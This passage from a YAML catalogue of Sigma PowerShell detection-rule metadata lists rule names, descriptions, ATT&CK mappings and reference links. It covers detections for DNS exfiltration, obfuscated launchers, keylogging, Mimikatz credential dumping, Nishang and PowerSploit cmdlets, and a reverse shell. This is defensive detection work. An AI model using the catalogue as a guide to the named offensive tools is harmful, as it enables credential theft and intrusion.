  description: DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS
    request covert channel
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048
  tags:
  - attack.exfiltration
  - attack.t1048
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1048/T1048.md#atomic-test-3---dnsexfiltration-doh
  - https://github.com/Arno0x/DNSExfiltrator
  false_positives:
  - Legitimate script
  notes: ''
- detection_id: 73e67340-0d25-11eb-adc1-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_clip.yml
  name: Invoke-Obfuscation CLIP+ Launcher - PowerShell
  description: Detects Obfuscated use of Clip.exe to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1b9dc62e-6e9e-42a3-8990-94d7a10007f7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_obfuscated_iex.yml
  name: Invoke-Obfuscation Obfuscated IEX Invocation - PowerShell
  description: Detects all variations of obfuscated powershell IEX invocation code
    generated by Invoke-Obfuscation framework from the following code block \u2014
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/danielbohannon/Invoke-Obfuscation/blob/f20e7f843edd0a3a7716736e9eddfa423395dd26/Out-ObfuscatedStringCommand.ps1#L873-L888
  false_positives:
  - Unknown
  notes: ''
- detection_id: 779c8c12-0eb1-11eb-adc1-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_stdin.yml
  name: Invoke-Obfuscation STDIN+ Launcher - Powershell
  description: Detects Obfuscated use of stdin to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0adfbc14-0ed1-11eb-adc1-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_var.yml
  name: Invoke-Obfuscation VAR+ Launcher - PowerShell
  description: Detects Obfuscated use of Environment Variables to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 20e5497e-331c-4cd5-8d36-935f6e2a9a07
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_compress.yml
  name: Invoke-Obfuscation COMPRESS OBFUSCATION - PowerShell
  description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: e6cb92b4-b470-4eb8-8a9d-d63e8583aae0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_rundll.yml
  name: Invoke-Obfuscation RUNDLL LAUNCHER - PowerShell
  description: Detects Obfuscated Powershell via RUNDLL LAUNCHER
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 86b896ba-ffa1-4fea-83e3-ee28a4c915c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_stdin.yml
  name: Invoke-Obfuscation Via Stdin - Powershell
  description: Detects Obfuscated Powershell via Stdin in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: db92dd33-a3ad-49cf-8c2c-608c3e30ace0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_use_clip.yml
  name: Invoke-Obfuscation Via Use Clip - Powershell
  description: Detects Obfuscated Powershell via use Clip.exe in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: e55a5195-4724-480e-a77e-3ebe64bd3759
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_use_mhsta.yml
  name: Invoke-Obfuscation Via Use MSHTA - PowerShell
  description: Detects Obfuscated Powershell via use MSHTA in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: a5a30a6e-75ca-4233-8b8c-42e0f2037d3b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_use_rundll32.yml
  name: Invoke-Obfuscation Via Use Rundll32 - PowerShell
  description: Detects Obfuscated Powershell via use Rundll32 in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: e54f5149-6ba3-49cf-b153-070d24679126
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_var.yml
  name: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - PowerShell
  description: Detects Obfuscated Powershell via VAR++ LAUNCHER
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 34f90d3c-c297-49e9-b26d-911b05a4866c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_keylogging.yml
  name: Powershell Keylogging
  description: Adversaries may log user keystrokes to intercept credentials as the
    user types them.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1056.001
  tags:
  - attack.credential-access
  - attack.collection
  - attack.t1056.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.001/src/Get-Keystrokes.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4fdc44df-bfe9-4fcc-b041-68f5a2d3031c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_localuser.yml
  name: Powershell LocalAccount Manipulation
  description: 'Adversaries may manipulate accounts to maintain access to victim systems.

    Account manipulation may consist of any action that preserves adversary access
    to a compromised account, such as modifying credentials or permission groups

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1098/T1098.md#atomic-test-1---admin-account-manipulate
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/?view=powershell-5.1
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: 4a241dea-235b-4a7e-8d76-50d817b146c4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_mailboxexport_share.yml
  name: Suspicious PowerShell Mailbox Export to Share - PS
  description: Detects usage of the powerShell New-MailboxExportRequest Cmdlet to
    exports a mailbox to a remote or local share, as used in ProxyShell exploitations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Exfiltration
  techniques: []
  tags:
  - attack.exfiltration
  time_window: ''
  references:
  - https://youtu.be/5mqid-7zp8k?t=2481
  - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
  - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1
  - https://m365internals.com/2022/10/07/hunting-in-on-premises-exchange-server-logs/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml
  name: Malicious PowerShell Commandlets - ScriptBlock
  description: Detects Commandlet names from well-known PowerShell exploitation frameworks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 12
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - risk_scoring_or_weighting
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1059.001
  - T1069
  - T1069.001
  - T1069.002
  - T1087
  - T1087.001
  - T1087.002
  - T1482
  tags:
  - attack.execution
  - attack.discovery
  - attack.t1482
  - attack.t1087
  - attack.t1087.001
  - attack.t1087.002
  - attack.t1069.001
  - attack.t1069.002
  - attack.t1069
  - attack.t1059.001
  time_window: ''
  references:
  - https://adsecurity.org/?p=2921
  - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries
  - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1
  - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1
  - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1
  - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1
  - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/
  - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/
  - https://github.com/calebstewart/CVE-2021-1675
  - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1
  - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html
  - https://github.com/HarmJ0y/DAMP
  - https://github.com/samratashok/nishang
  - https://github.com/DarkCoderSc/PowerRunAsSystem/
  - https://github.com/besimorhino/powercat
  - https://github.com/Kevin-Robertson/Powermad
  - https://github.com/adrecon/ADRecon
  - https://github.com/adrecon/AzureADRecon
  - https://github.com/The-Viper-One/Invoke-PowerDPAPI/
  - https://github.com/Arno0x/DNSExfiltrator/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f62176f3-8128-4faa-bf6c-83261322e5eb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_malicious_keywords.yml
  name: Malicious PowerShell Keywords
  description: Detects keywords from well-known PowerShell exploitation frameworks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://adsecurity.org/?p=2921
  false_positives:
  - Depending on the scripts, this rule might require some initial tuning to fit the
    environment
  notes: ''
- detection_id: cd185561-4760-45d6-a63e-a51325112cae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_memorydump_getstoragediagnosticinfo.yml
  name: Live Memory Dump Using Powershell
  description: Detects usage of a PowerShell command to dump the live memory of a
    Windows machine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/storage/get-storagediagnosticinfo?view=windowsserver2022-ps
  false_positives:
  - Diagnostics
  notes: ''
- detection_id: b7216a7d-687e-4c8d-82b1-3080b2ad961f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_modify_group_policy_settings.yml
  name: Modify Group Policy Settings - ScriptBlockLogging
  description: Detect malicious GPO modifications can be used to implement many other
    malicious behaviors.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1484.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1484.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1484.001/T1484.001.md
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 78aa1347-1517-4454-9982-b338d6df8343
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_msxml_com.yml
  name: Powershell MsXml COM Object
  description: 'Adversaries may abuse PowerShell commands and scripts for execution.

    PowerShell is a powerful interactive command-line interface and scripting environment
    included in the Windows operating system. (Citation: TechNet PowerShell)

    Adversaries can use PowerShell to perform a number of actions, including discovery
    of information and execution of code

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-7---powershell-msxml-com-object---with-prompt
  - https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms766431(v=vs.85)
  - https://www.trendmicro.com/en_id/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-x.html
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: f772cee9-b7c2-4cb2-8f07-49870adc02e0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_nishang_malicious_commandlets.yml
  name: Malicious Nishang PowerShell Commandlets
  description: Detects Commandlet names and arguments from the Nishang exploitation
    framework
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/samratashok/nishang
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8c521530-5169-495d-a199-0a3a881ad24e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_ntfs_ads_access.yml
  name: NTFS Alternate Data Stream
  description: Detects writing data into NTFS alternate data streams from powershell.
    Needs Script Block Logging.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://web.archive.org/web/20220614030603/http://www.powertheshell.com/ntfsstreams/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.004/T1564.004.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 36fbec91-fa1b-4d5d-8df1-8d8edcb632ad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_office_comobject_registerxll.yml
  name: Code Executed Via Office Add-in XLL File
  description: 'Adversaries may abuse Microsoft Office add-ins to obtain persistence
    on a compromised system.

    Office add-ins can be used to add functionality to Office programs

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137.006
  tags:
  - attack.persistence
  - attack.t1137.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1137.006/T1137.006.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: da34e323-1e65-42db-83be-a6725ac2caa3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_packet_capture.yml
  name: Potential Packet Capture Activity Via Start-NetEventSession - ScriptBlock
  description: 'Detects the execution of powershell scripts with calls to the "Start-NetEventSession"
    cmdlet. Which allows an attacker to start event and packet capture for a network
    event session.

    Adversaries may attempt to capture network to gather information over the course
    of an operation.

    Data captured via this technique may include user credentials, especially those
    sent over an insecure, unencrypted protocol.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1040
  tags:
  - attack.credential-access
  - attack.discovery
  - attack.t1040
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/5f866ca4517e837c4ea576e7309d0891e78080a8/atomics/T1040/T1040.md#atomic-test-16---powershell-network-sniffing
  - https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/7b8935fe4c82cb64d61343de1a8b2e38dd968534/handbooks/10_post_exploitation.md
  - https://github.com/forgottentq/powershell/blob/9e616363d497143dc955c4fdce68e5c18d28a6cb/captureWindows-Endpoint.ps1#L13
  false_positives:
  - Legitimate network diagnostic scripts.
  notes: ''
- detection_id: 189e3b02-82b2-4b90-9662-411eb64486d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_potential_invoke_mimikatz.yml
  name: Potential Invoke-Mimikatz PowerShell Script
  description: Detects Invoke-Mimikatz PowerShell script and alike. Mimikatz is a
    credential dumper capable of obtaining plaintext Windows account logins and passwords.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/potential-invoke-mimikatz-powershell-script.html#potential-invoke-mimikatz-powershell-script
  false_positives:
  - Mimikatz can be useful for testing the security of networks
  notes: ''
- detection_id: cdfa73b6-3c9d-4bb8-97f8-ddbd8921f5c5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_potential_unconstrained_delegation_discovery.yml
  name: Potential Unconstrained Delegation Discovery Via Get-ADComputer - ScriptBlock
  description: Detects the use of the "Get-ADComputer" cmdlet in order to identify
    systems which are configured for unconstrained delegation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  - Reconnaissance
  techniques:
  - T1018
  - T1558
  - T1589.002
  tags:
  - attack.reconnaissance
  - attack.discovery
  - attack.credential-access
  - attack.t1018
  - attack.t1558
  - attack.t1589.002
  time_window: ''
  references:
  - https://pentestlab.blog/2022/03/21/unconstrained-delegation/
  - https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adcomputer?view=windowsserver2022-ps
  false_positives:
  - Legitimate use of the library for administrative activity
  notes: ''
- detection_id: 5f9c7f1a-7c21-4c39-b2f3-8d8006e0e51f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_powershell_web_access_installation.yml
  name: PowerShell Web Access Installation - PsScript
  description: Detects the installation and configuration of PowerShell Web Access,
    which could be used for remote access and potential abuse
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.001
  tags:
  - attack.persistence
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/powershell/module/powershellwebaccess/install-pswawebapplication
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a
  - https://gist.github.com/MHaggis/7e67b659af9148fa593cf2402edebb41
  false_positives:
  - Legitimate PowerShell Web Access installations by administrators
  notes: ''
- detection_id: dcd74b95-3f36-4ed9-9598-0490951643aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_powerview_malicious_commandlets.yml
  name: PowerView PowerShell Cmdlets - ScriptBlock
  description: Detects Cmdlet names from PowerView of the PowerSploit exploitation
    framework.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://powersploit.readthedocs.io/en/stable/Recon/README
  - https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
  - https://thedfirreport.com/2020/10/08/ryuks-return
  - https://adsecurity.org/?p=2277
  false_positives:
  - Unknown
  notes: ''
- detection_id: ca8b77a9-d499-4095-b793-5d5f330d450e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_prompt_credentials.yml
  name: PowerShell Credential Prompt
  description: Detects PowerShell calling a credential prompt
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.credential-access
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://twitter.com/JohnLaTwC/status/850381440629981184
  - https://t.co/ezOTGy1a1G
  false_positives:
  - Unknown
  notes: ''
- detection_id: afd3df04-948d-46f6-ae44-25966c44b97f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_psasyncshell.yml
  name: PSAsyncShell - Asynchronous TCP Reverse Shell
  description: Detects the use of PSAsyncShell an Asynchronous TCP Reverse Shell written
    in powershell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/JoelGMSec/PSAsyncShell
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_psattack.yml
  name: PowerShell PSAttack
  description: Detects the use of PSAttack PowerShell hack tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://adsecurity.org/?p=2921
  false_positives:
  - Unknown
  notes: ''
- detection_id: a0edd39f-a0c6-4c17-8141-261f958e8d8f
  source_id: sigmahq_sigma
